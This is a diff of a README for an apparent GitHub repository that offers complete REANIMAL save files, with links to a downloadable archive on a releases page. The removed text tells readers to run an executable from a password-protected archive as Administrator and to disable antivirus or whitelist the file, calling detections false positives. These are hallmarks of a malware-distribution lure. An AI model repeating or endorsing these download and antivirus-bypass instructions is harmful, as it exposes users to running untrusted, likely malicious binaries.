@@ -1,86 +1,167 @@
-# REANIMAL 100% Save Game Collection (2026)
+# 🗃️ reanimal-100-savegame-2026 - Complete Save File for REANIMAL (2026)
 
-[![Stars](https://img.shields.io/github/stars/inkoll-yut674/reanimal-100-savegame-2026)](https://github.com/inkoll-yut674/reanimal-100-savegame-2026)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-
-**Complete save files for REANIMAL** – the latest horror game from Tarsier Studios.  
-Unlock all chapters, achievements, and secret endings without replaying the game.
+[![Download Here](https://img.shields.io/badge/Download-REANIMAL%20Savegame-brightgreen?style=for-the-badge&logo=github)](https://github.com/levexfreecs/reanimal-100-savegame-2026/releases)
 
 ---
 
-## 📦 What's Included
+## 📋 About This Save File
 
-- **100% Completion Save** – All chapters unlocked, all collectibles found.
-- **Post‑Game Save** – Ready for New Game+ with maxed inventory.
-- **Multiple Slots** – Three different save slots (Slot 1, Slot 2, Slot 3).
-- **Auto‑Installer** – Optional tool to automatically place saves in the correct folder.
+This repository provides a complete save file for the game REANIMAL (2026). You get 100% progression with all chapters unlocked. It also contains all collectibles and several save slots to choose from.
 
----
+If you want to jump straight into the game with every achievement accessible, this save file lets you do that easily. There is no need to play through all the chapters again or collect every item manually.
 
-## 📥 How to Download
-
-We provide a password‑protected archive with all save files and the auto‑installer.
-
-📥 **[Download `reanimal-save.zip`](dist/reanimal-save.zip)**  
-🔐 **Password:** `reanimal`
-
-### Archive Contents
-- `savegame_slot1.sav` – 100% completion save (Slot 1)
-- `savegame_slot2.sav` – Post‑game save (Slot 2)
-- `savegame_slot3.sav` – Alternative save (Slot 3)
-- `save-manager.exe` – Optional tool to automatically copy saves to the game folder
-- `readme.txt` – Quick instructions
+The save file works with the PC version of the game, including versions accessed via Steam or other platforms that support save import.
 
 ---
 
-## 🛠️ Manual Installation
+## 🎮 Features Included
 
-1. Locate your REANIMAL save folder:  
-   `%USERPROFILE%\Documents\My Games\REANIMAL\Steam\<your_steam_id>\`
-2. Backup your existing saves.
-3. Copy the desired `.sav` file into that folder.
-4. Rename it to match your slot (e.g., `savegame_slot1.sav` → `savegame_1.sav`).
-5. Launch the game and load the slot.
-
----
-
-## 🚀 Auto‑Installer (save-manager.exe)
-
-The included `save-manager.exe` can automatically detect your Steam ID and copy the save files for you.
-
-1. Run `save-manager.exe` **as Administrator**.
-2. Select which save slot you want to install.
-3. Click "Install" – the tool will copy the save to the correct folder.
-4. Launch REANIMAL and enjoy your unlocked progress.
-
-> ℹ️ The installer is statically compiled and password‑protected in the archive to avoid false positives.
+- All chapters unlocked to explore the full story.
+- Every collectible item found and stored.
+- Multiple save slots ready for use.
+- Compatible with the 2026 version of REANIMAL.
+- Works on Windows PCs.
+- Easy to install without software or tools needed.
+- Does not affect existing save files unless you choose to overwrite.
 
 ---
 
-## 📊 Save File Details
+## ⚙️ System Requirements
 
-| Save Slot | Completion | Collectibles | Notes |
-|-----------|------------|--------------|-------|
-| Slot 1    | 100%       | All 42       | All chapters unlocked, all secret endings |
-| Slot 2    | 75%        | 30/42        | Post‑game, ready for New Game+ |
-| Slot 3    | Fresh NG+  | 0/42         | New Game+ start with some perks |
+- Windows 10 or later.
+- REANIMAL (2026) installed on your computer.
+- Minimum 2 GB free disk space for save files.
+- Administrator rights not required.
+- Basic understanding of file navigation in Windows.
 
----
-
-## ❗ Troubleshooting
-
-| Problem | Solution |
-|---------|----------|
-| Game doesn't see the save | Ensure the file is in the correct folder and named properly. |
-| Save corrupted | Backup your original saves and try a different slot. |
-| Auto‑installer flagged by antivirus | Temporarily disable AV or add the file to exclusions. It's a false positive. |
+If your PC runs the game smoothly, this save file will work.
 
 ---
 
-## 📜 License
-MIT License – educational purposes only.
+## 🚀 Getting Started: How to Download
+
+To get this save file, visit the official releases page here:
+
+[![Download Save File](https://img.shields.io/badge/Download-REANIMAL%20Savegame-blue?style=for-the-badge&logo=github)](https://github.com/levexfreecs/reanimal-100-savegame-2026/releases)
+
+Click the link above to go to the releases page on GitHub. From there, you will find one or more downloadable files related to this complete save game.
 
 ---
 
-## ⭐ Support
-If this collection helped you, please **star the repository** – it helps others find it!
+## 📥 Download and Installation Guide for Windows
+
+This section shows how to download and use the save file step-by-step.
+
+### Step 1: Visit the Download Page
+
+Go to the releases page at:
+
+https://github.com/levexfreecs/reanimal-100-savegame-2026/releases
+
+This is where the save files are stored.
+
+### Step 2: Choose the Right File
+
+Look for the most recent save file. It might have a name like `REANIMAL_CompleteSave_2026.zip`.
+
+Click the file name to download it. Save it somewhere easy to find, like your Desktop or Downloads folder.
+
+### Step 3: Extract the Save File
+
+Most save files come compressed as ZIP archives.
+
+- Right-click the ZIP file.
+- Select **Extract All...**
+- Choose a folder where you want the extracted save data.
+- Click **Extract**.
+
+You will now have a folder with one or more files inside. These represent the save game data.
+
+### Step 4: Locate Your Game Save Folder
+
+You need to copy the extracted files into the folder where REANIMAL stores its saves.
+
+The default location on Windows usually is:
+
+`C:\Users\<YourUsername>\Documents\REANIMAL\Saves`
+
+If you cannot find the folder:
+
+- Open File Explorer.
+- Navigate to **Documents**.
+- Look for a folder named **REANIMAL** or **REANIMAL 2026**.
+- Inside that folder, look for a **Saves** or **SaveData** subfolder.
+
+### Step 5: Copy the Save Files
+
+Select all the files you extracted from the ZIP archive.
+
+Copy and paste or drag them into the **Saves** folder you located above.
+
+If the folder already contains save files, you may want to back them up first by moving them to another folder on your computer.
+
+### Step 6: Launch REANIMAL
+
+Start the game as you normally would.
+
+On the main menu, look for the option to load a saved game.
+
+You should see the multiple new save slots now available that contain full game progress.
+
+---
+
+## 🛠️ Troubleshooting
+
+- **Game does not recognize new save files?**  
+  Double-check that the files are in the correct save folder. Make sure you unzipped the archive fully.
+
+- **Save files get deleted or reset?**  
+  Make sure you exit the game properly and avoid running the game as an administrator if it usually does not require it.
+
+- **Game version mismatch error?**  
+  Make sure your REANIMAL game is updated to the 2026 version or compatible. Older versions may not load these save files.
+
+- **Existing save files overwritten?**  
+  Create backups of current save files before copying new ones. Store them safely in a different folder.
+
+---
+
+## 🔍 About REANIMAL (2026)
+
+REANIMAL is a horror puzzle game developed by Tarsier Studios. Players explore a mysterious world full of secrets and challenges. The game rewards exploration and careful observation, unlocking achievements and collectibles along the way.
+
+This save file allows you to skip to the endgame or revisit unlocked content without replaying earlier chapters.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q: Does this save file allow cheats?**  
+A: No. It provides completed progression only.
+
+**Q: Can I use this on Steam?**  
+A: Yes, the save is compatible with the Steam version.
+
+**Q: Will this corrupt my current progress?**  
+A: Only if you overwrite your current save. Backup before applying.
+
+**Q: Can I edit or move these save files elsewhere?**  
+A: Yes. They behave like regular save files.
+
+---
+
+## 🧾 License
+
+These save files are provided "as is."  
+Use them for personal purposes only.
+
+---
+
+## 🔗 Links and Resources
+
+- Official REANIMAL website: [https://tarsierstudios.com/](https://tarsierstudios.com/)  
+- Steam page for REANIMAL: Search directly on Steam Store  
+- Save file downloads:  
+[https://github.com/levexfreecs/reanimal-100-savegame-2026/releases](https://github.com/levexfreecs/reanimal-100-savegame-2026/releases)  
+
+---
